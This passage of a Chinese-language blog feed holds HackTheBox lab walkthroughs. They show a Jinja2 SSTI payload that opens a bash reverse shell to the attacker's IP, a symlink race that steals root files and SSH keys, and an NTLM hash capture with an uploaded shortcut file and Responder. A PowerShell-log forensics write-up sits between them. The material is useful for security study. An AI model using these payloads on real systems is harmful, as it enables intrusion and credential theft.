class="hljs-keyword">and</span> request.form[<span class="hljs-string">&#x27;password&#x27;</span>]==<span class="hljs-string">&quot;admin&quot;</span>:<br>res = make_response()<br>username=request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>token=jwt.encode(&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;,secret,algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<br>res.set_cookie(<span class="hljs-string">&quot;auth&quot;</span>,token)<br>res.headers[<span class="hljs-string">&#x27;location&#x27;</span>]=<span class="hljs-string">&#x27;/home&#x27;</span><br><span class="hljs-keyword">return</span> res,<span class="hljs-number">302</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br></code></pre></td></tr></table></figure><p>似乎只需要一个username字段：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ python          <br>Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux<br>Type <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> or <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br>&gt;&gt;&gt; import jwt<br>&gt;&gt;&gt; secret=<span class="hljs-string">&#x27;RrXCv`mrNe!K!4+5`wYq&#x27;</span><br>&gt;&gt;&gt; jwt.encode(&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;,secret,algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<br><span class="hljs-string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg&#x27;</span><br>&gt;&gt;&gt; <br></code></pre></td></tr></table></figure><p>访问&#x2F;track。将cookie添加进浏览器，这次不会在跳转回登录页面了。顺着刚刚找到的SSTI漏洞，找到&#x2F;order。随便填一下抓包：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823091208816.png" alt="image-20220823091208816"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs BASH">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti<span class="hljs-comment">#jinja-injection</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /order HTTP/1.1<br>Host: 10.10.11.134:5000<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 262<br>Origin: http://10.10.11.134:5000<br>DNT: 1<br>Connection: close<br>Referer: http://10.10.11.134:5000/order<br>Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg<br>Upgrade-Insecure-Requests: 1<br><br>costume=&#123;% <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ().__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;warning&quot;</span> <span class="hljs-keyword">in</span> x.__name__ %&#125;&#123;&#123;x()._module.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;%26 /dev/tcp/10.10.16.13/1337 0&gt;%261&quot;&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;&#123;%endif%&#125;&#123;% endfor %&#125;&amp;addr=<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ nc -lvnp 1337         <br>listening on [any] 1337 ...<br>connect to [10.10.16.13] from (UNKNOWN) [10.10.11.134] 49646<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (970): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>tom@epsilon:/var/www/app$ script -qc /bin/bash /dev/null<br>script -qc /bin/bash /dev/null<br>tom@epsilon:/var/www/app$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>app.py  static  templates<br>tom@epsilon:/var/www/app$ <br></code></pre></td></tr></table></figure><p>在当前目录app.py中有一串密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">@app.route(<span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;POST&quot;</span>])<br>def index():<br>        <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&quot;POST&quot;</span>:<br>                <span class="hljs-keyword">if</span> request.form[<span class="hljs-string">&#x27;username&#x27;</span>]==<span class="hljs-string">&quot;admin&quot;</span> and request.form[<span class="hljs-string">&#x27;password&#x27;</span>]==<span class="hljs-string">&quot;4d_09@fhgRTdws2&quot;</span>:<br>                        res = make_response()<br>                        username=request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>                        token=jwt.encode(&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;,secret,algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<br>                        res.set_cookie(<span class="hljs-string">&quot;auth&quot;</span>,token)<br>                        res.headers[<span class="hljs-string">&#x27;location&#x27;</span>]=<span class="hljs-string">&#x27;/home&#x27;</span><br>                        <span class="hljs-built_in">return</span> res,302<br>                <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>不过没啥用，枚举时候枚举到了这个：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@epsilon:~$ <span class="hljs-built_in">cat</span> /usr/bin/backup.sh<br><span class="hljs-built_in">cat</span> /usr/bin/backup.sh<br><span class="hljs-comment">#!/bin/bash</span><br>file=`<span class="hljs-built_in">date</span> +%N`<br>/usr/bin/rm -rf /opt/backups/*<br>/usr/bin/tar -cvf <span class="hljs-string">&quot;/opt/backups/<span class="hljs-variable">$file</span>.tar&quot;</span> /var/www/app/<br><span class="hljs-built_in">sha1sum</span> <span class="hljs-string">&quot;/opt/backups/<span class="hljs-variable">$file</span>.tar&quot;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27; &#x27;</span> -f1 &gt; /opt/backups/checksum<br><span class="hljs-built_in">sleep</span> 5<br>check_file=`<span class="hljs-built_in">date</span> +%N`<br>/usr/bin/tar -chvf <span class="hljs-string">&quot;/var/backups/web_backups/<span class="hljs-variable">$&#123;check_file&#125;</span>.tar&quot;</span> /opt/backups/checksum <span class="hljs-string">&quot;/opt/backups/<span class="hljs-variable">$file</span>.tar&quot;</span><br>/usr/bin/rm -rf /opt/backups/*<br></code></pre></td></tr></table></figure><p>每分钟都在以root权限运行这个。他会先删除&#x2F;opt&#x2F;backups&#x2F;*所有文件，然后创建一个&#x2F;var&#x2F;www&#x2F;app&#x2F;归档，并保存新文件的哈希，然后休眠5秒再把哈希文件以时间戳的形式放到&#x2F;var&#x2F;backups&#x2F;web_backups&#x2F;。借用了下别人的思路：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> :; <span class="hljs-keyword">do</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -f checksum; <span class="hljs-keyword">then</span> <span class="hljs-built_in">rm</span> -f checksum; <span class="hljs-built_in">ln</span> -s /root checksum; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Replaced checksum&quot;</span>; <span class="hljs-built_in">sleep</span> 5; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Backup probably done now&quot;</span>; <span class="hljs-built_in">break</span>; <span class="hljs-keyword">fi</span>; <span class="hljs-built_in">sleep</span> 1; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>会一直检测当前目录是否存在checksum，利用备份时间五秒的空档，将checksum链接向root目录，在之后的备份中就会把root目录备份进归档文件，然后解压归档文件获取flag。这应该算是一个linux机制问题。普通用户可以随意的创建指向root用户文件的链接。等该backup脚本执行完。寻找对应的归档文件将其解压就能获取到root用户目录下的文件。包括ssh秘钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@epsilon:/tmp$ <span class="hljs-built_in">cd</span> opt/<br>tom@epsilon:/tmp/opt$ <span class="hljs-built_in">ls</span><br>backups<br>tom@epsilon:/tmp/opt$ <span class="hljs-built_in">cd</span> backups/<br>tom@epsilon:/tmp/opt/backups$ <span class="hljs-built_in">ls</span><br>188966943.tar  checksum<br>tom@epsilon:/tmp/opt/backups$ <span class="hljs-built_in">cd</span> checksum/<br>tom@epsilon:/tmp/opt/backups/checksum$ <span class="hljs-built_in">ls</span><br>docker-compose.yml  lambda.sh  root.txt  src<br>tom@epsilon:/tmp/opt/backups/checksum$ ca    <span class="hljs-built_in">cat</span> or     root.txt<br>croot.txt: <span class="hljs-built_in">command</span> not found<br>tom@epsilon:/tmp/opt/backups/checksum$ <span class="hljs-built_in">cat</span> root.txt<br>9bfc9a51702402ebbf1ad320d4648a65<br>tom@epsilon:/tmp/opt/backups/checksum$ <span class="hljs-built_in">ls</span> -al<br>total 60<br>drwx------  9 tom tom 4096 Dec 20  2021 .<br>drwxrwxr-x  3 tom tom 4096 Aug 23 01:53 ..<br>drwxr-xr-x  2 tom tom 4096 Dec 20  2021 .aws<br>-rw-r--r--  1 tom tom 3106 Dec  5  2019 .bashrc<br>drwx------  4 tom tom 4096 Dec 20  2021 .cache<br>drwxr-xr-x  3 tom tom 4096 Dec 20  2021 .config<br>-rw-r--r--  1 tom tom  356 Nov 17  2021 docker-compose.yml<br>-rw-r--r--  1 tom tom   33 Nov 17  2021 .gitconfig<br>-rwxr-xr-x  1 tom tom  453 Nov 17  2021 lambda.sh<br>drwxr-xr-x  3 tom tom 4096 Dec 20  2021 .<span class="hljs-built_in">local</span><br>drwxr-xr-x 36 tom tom 4096 Aug 23 00:12 .localstack<br>-rw-r--r--  1 tom tom  161 Dec  5  2019 .profile<br>-rw-r-----  1 tom tom   33 Aug 23 00:11 root.txt<br>drwxr-xr-x  2 tom tom 4096 Dec 20  2021 src<br>drwx------  2 tom tom 4096 Dec 20  2021 .ssh<br>tom@epsilon:/tmp/opt/backups/checksum$ <span class="hljs-built_in">cd</span> .ssh<br>tom@epsilon:/tmp/opt/backups/checksum/.ssh$ <span class="hljs-built_in">ls</span><br>authorized_keys  id_rsa  id_rsa.pub<br>tom@epsilon:/tmp/opt/backups/checksum/.ssh$ <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Event Horizon</title>
    <link href="/post/HackTheBox-Event-Horizon.html"/>
    <url>/post/HackTheBox-Event-Horizon.html</url>
    
    <content type="html"><![CDATA[<p>Our CEO’s computer was compromised in a phishing attack. The attackers took care to clear the PowerShell logs, so we don’t know what they executed. Can you help us?</p><p>我们首席执行官的电脑在一次网络钓鱼攻击中被破坏了。攻击者小心翼翼地清除了PowerShell的日志，所以我们不知道他们执行了什么。你能帮助我们吗?</p><h6 id="Start"><a href="#Start" class="headerlink" title="Start:"></a>Start:</h6><p>说是powershell日志被清除了。那我也应该先检查一下看它有没有漏删的。找到了四个powershell日志：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609160017641.png" alt="image-20220609160017641"></p><p>有三个是空的，只有5M大小的这一个中还保留了很多信息，按照级别与时间排序：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609160126105.png" alt="image-20220609160126105"></p><p>直接就看到了flag，但我还是想看它做了些什么。首先能够看到PowerUp，这是powershell一个提权辅助工具。它尝试了很多种提权方式：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609160739969.png" alt="image-20220609160739969"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609160856347.png" alt="image-20220609160856347"></p><p>令牌，好吧，它偷到了：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609160946748.png" alt="image-20220609160946748"></p><p>然后它遍历了开机启动项：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609161049834.png" alt="image-20220609161049834"></p><p>读取了用户的权限：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609161203152.png" alt="image-20220609161203152"></p><p>23号的日志变没了，看起来主要是提权与留后门。</p><p>之后在10月26号执行了mimiktaz，被杀软拦截了：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609161746209.png" alt="image-20220609161746209"></p><p>在27号又执行了两次，都被拦截了：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220609162016898.png" alt="image-20220609162016898"></p><p>再往下走就没日志了。</p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Digital Forensics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Driver</title>
    <link href="/post/HackTheBox-Driver.html"/>
    <url>/post/HackTheBox-Driver.html</url>
    
    <content type="html"><![CDATA[<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><p>masscan在扫描Windows及其容易出现漏端口的行为，这是我无法接受的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.106<br>Host is up (0.12s latency).<br>Not shown: 65531 filtered tcp ports (no-response)<br>PORT     STATE SERVICE      VERSION<br>80/tcp   open  http         Microsoft IIS httpd 10.0<br>| http-auth: <br>| HTTP/1.1 401 Unauthorized\x0D<br>|_  Basic realm=MFP Firmware Update Center. Please enter password <span class="hljs-keyword">for</span> admin<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="hljs-string">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="hljs-string">445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="hljs-string">5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="hljs-string">|_http-title: Not Found</span><br><span class="hljs-string">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="hljs-string">Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb-security-mode: </span><br><span class="hljs-string">|   account_used: guest</span><br><span class="hljs-string">|   authentication_level: user</span><br><span class="hljs-string">|   challenge_response: supported</span><br><span class="hljs-string">|_  message_signing: disabled (dangerous, but default)</span><br><span class="hljs-string">| smb2-time: </span><br><span class="hljs-string">|   date: 2022-05-16T14:46:55</span><br><span class="hljs-string">|_  start_date: 2022-05-16T14:39:15</span><br><span class="hljs-string">| smb2-security-mode: </span><br><span class="hljs-string">|   3.1.1: </span><br><span class="hljs-string">|_    Message signing enabled but not required</span><br><span class="hljs-string">|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 255.20 seconds</span><br></code></pre></td></tr></table></figure><p>80端口需要提供账号口令，而我没有：</p><p>而其他端口都不被允许匿名访问。看起来突破口确实是在80，好吧，admin&#x2F;admin进去了，其实就这一个能点，其他都是假按钮：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220516155857682.png" alt="image-20220516155857682" /><p>随便提交一个文件，可以读取到HTTP请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/fw_up.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.106<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------32797649710965608502761959682<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1306<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.11.106<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic YWRtaW46YWRtaW4=<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.11.106/fw_up.php<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------32797649710965608502761959682</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;printers&quot;</span><br><span class="language-pgsql">HTB DesignJet</span><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------32797649710965608502761959682</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;firmware&quot;; filename=&quot;cacert.der&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/x-x509-ca-cert</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">0</span>¨<span class="hljs-number">0</span> </span><br></code></pre></td></tr></table></figure><p>会提示成功：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220516160301762.png" alt="image-20220516160301762"  /><p>看起来好像是什么都能传：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[InternetShortcut]</span><br><span class="hljs-attr">URL</span>=whatever<br><span class="hljs-attr">WorkingDirectory</span>=whatever<br><span class="hljs-attr">IconFile</span>=\\<span class="hljs-number">10.10</span>.<span class="hljs-number">16.7</span>\%USERNAME%.icon<br><span class="hljs-attr">IconIndex</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo responder -I tun0                                           <br>[sudo] mosaictheory 的密码：<br>                                         __<br>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.<br>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|<br>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|<br>                   |__|<br><br>           NBT-NS, LLMNR &amp; MDNS Responder 3.1.1.0<br><br>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)<br>  To <span class="hljs-built_in">kill</span> this script hit CTRL-C<br><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220516161438481.png" alt="image-20220516161438481"  /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; hashcat -m 5600 <span class="hljs-built_in">hash</span> /usr/share/wordlists/rockyou.txt --force<br><br>TONY::DRIVER:913a938f1fb463b5:ffa92e39b6201e8731a288ece8fc0fa4:0101000000000000008590db3e69d801a12e4b2e904c599d00000000020008004a0045005700370001001e00570049004e002d005500360032004a004d004f005000500053004a00550004003400570049004e002d005500360032004a004d004f005000500053004a0055002e004a004500570037002e004c004f00430041004c00030014004a004500570037002e004c004f00430041004c00050014004a004500570037002e004c004f00430041004c0007000800008590db3e69d80106000400020000000800300030000000000000000000000000200000af20d57f4b4348c88fd4acfac68f826ba8249ad294536a15de0a5899484cd0200a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003700000000000000000000000000:liltony<br></code></pre></td></tr></table></figure><p>SMB没有更多的东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; smbmap -H 10.10.11.106 -u tony -p liltony<br>[+] IP: 10.10.11.106:445Name: 10.10.11.106                                      <br>        Disk                                                  PermissionsComment<br>----                                                  ------------------<br>ADMIN$                                            NO ACCESSRemote Admin<br>C$                                                NO ACCESSDefault share<br>IPC$                                              READ ONLYRemote IPC<br></code></pre></td></tr></table></figure><p>我可以直接链接5985 的winrm：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt;&gt; evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.106</span> <span class="hljs-literal">-u</span> tony <span class="hljs-literal">-p</span> <span class="hljs-string">&quot;liltony&quot;</span><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\tony&gt; <span class="hljs-built_in">cd</span> Desktop<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\tony\Desktop&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\tony\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br><span class="hljs-literal">-ar---</span>        <span class="hljs-number">5</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">7</span>:<span class="hljs-number">39</span> AM             <span class="hljs-number">34</span> user.txt<br><br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\tony\Desktop&gt; <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-number">6</span>..........................................<br></code></pre></td></tr></table></figure><p>没什么权限信息，而且执行不了systeminfo：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\tony\Desktop&gt; whoami /all<br><br>USER INFORMATION<br><span class="hljs-literal">----------------</span><br><br>User Name   SID<br>=========== ==============================================<br>driver\tony S<span class="hljs-literal">-1-5-21-3114857038-1253923253-2196841645-1003</span><br><br><br><span class="hljs-built_in">GROUP</span> INFORMATION<br><span class="hljs-literal">-----------------</span><br><br><span class="hljs-built_in">Group</span> Name                             <span class="hljs-built_in">Type</span>             SID          Attributes<br>====================================== ================ ============ ==================================================<br>Everyone                               Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span 